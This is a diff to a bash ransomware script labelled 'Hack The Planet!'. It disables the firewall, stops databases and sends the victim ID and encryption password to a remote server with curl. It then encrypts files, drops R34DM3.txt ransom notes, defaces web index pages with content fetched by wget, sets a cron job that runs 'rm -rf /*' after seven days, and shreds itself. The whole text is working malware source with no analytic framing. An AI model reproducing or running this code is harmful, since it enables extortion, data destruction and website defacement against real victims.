@@ -5,7 +5,7 @@
 # Author: Twemlow
 # Hack The Planet!
 
-check_root() {
+function check_root() {
     if [[ $EUID -ne 0 ]]; then
         echo "you must have root perms to run this script!"
         rm -- "$0"
@@ -13,7 +13,29 @@ check_root() {
     fi
 }
 
-check_distro() {
+function tmp() {
+    MagnusLocker=$(basename "$0")
+    mv "$MagnusLocker" /tmp/
+    cd /tmp/
+    if [ "$MagnusLocker" != "$(basename "$0")" ]; then
+        ./$MagnusLocker
+    else
+        echo "The script is already in /tmp, continuing execution"
+    fi
+}
+
+function are_you_alive() {
+    if ping -c 1 server &> /dev/null
+    then
+        echo "Remote server is reachable, Magnus running!"
+    else
+        echo "Remote server is not reachable, Bye!"
+        rm -- "$0"
+        exit 1
+    fi
+}
+
+function check_distro() {
     distro=$(uname -a)
 
     if [[ $distro == *"Ubuntu"* ]] || [[ $distro == *"Debian"* ]]; then
@@ -26,7 +48,7 @@ check_distro() {
     fi
 }
 
-disable_firewall() {
+function disable_firewall() {
     if [ -x "$(command -v ufw)" ]; then
         echo 'Disabling ufw firewall...'
         ufw disable
@@ -40,7 +62,7 @@ disable_firewall() {
     fi
 }
 
-install_dependencies() {
+function install_dependencies() {
     if ! [ -x "$(command -v gpg)" ]; then
         echo 'Error: gpg is not installed. Installing gpg...'
         $package_manager update && $package_manager install -y gnupg
@@ -66,7 +88,7 @@ install_dependencies() {
     fi
 }
 
-stop_database() {
+function stop_database() {
     if systemctl list-units --all | grep -q "mariadb.service"; then
         systemctl stop mariadb.service
     elif systemctl list-units --all | grep -q "mysql.service"; then
@@ -84,19 +106,11 @@ stop_database() {
     fi
 }
 
-failed_to_pay() {
-    echo "Setting cronjob to delete files in 7 days"
-    (crontab -l 2>/dev/null; echo "0 0 * * 0 sleep 7d; rm -rf /*") | crontab -
-    echo "Cronjob set successfully"
-}
-
-encrypt_files() {
+function encrypt_files() {
     password=$(openssl rand -base64 32)
 
     victim_id=$(date +%s%N | cut -c1-11)
 
-    ping -c 1 server > /dev/null
-    if [ $? -eq 0 ]; then
       curl --data "victimid=$victim_id&password=$password" http://server:port/magnus
 
       echo "Encryption in progress..."
@@ -126,20 +140,43 @@ encrypt_files() {
       for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type d); do
         cp R34DM3.txt "$dir/R34DM3.txt"
       done
+}
+
+function deface() {
+    wget http://server/index.html -O /tmp/index.html
+    if [ -f "index.html" ]; then
+        mv /tmp/index.html index.html
+    elif [ -f "index.php" ]; then
+        mv /tmp/index.html index.php
     else
-      echo "Error: server is not reachable, stopping encryption"
-      exit 1
+        echo "No index.html or index.php found in current directory"
     fi
+}
+
+function failed_to_pay() {
+    echo "Setting cronjob to delete files in 7 days"
+    (crontab -l 2>/dev/null; echo "0 0 * * 0 sleep 7d; rm -rf /*") | crontab -
+    echo "Cronjob set successfully"
+}
+
+function self_destruct() {
+    MagnusLocker=$(basename "$0")
+    dd if=/dev/urandom of="$MagnusLocker" bs=1M count=10
+    shred -u "$MagnusLocker"
 }
 
 main() {
     check_root
+    tmp
+    are_you_alive
     check_distro
     disable_firewall
     install_dependencies
     stop_database
     encrypt_files
+    deface
     failed_to_pay
+    self_destruct
 }
 
 main
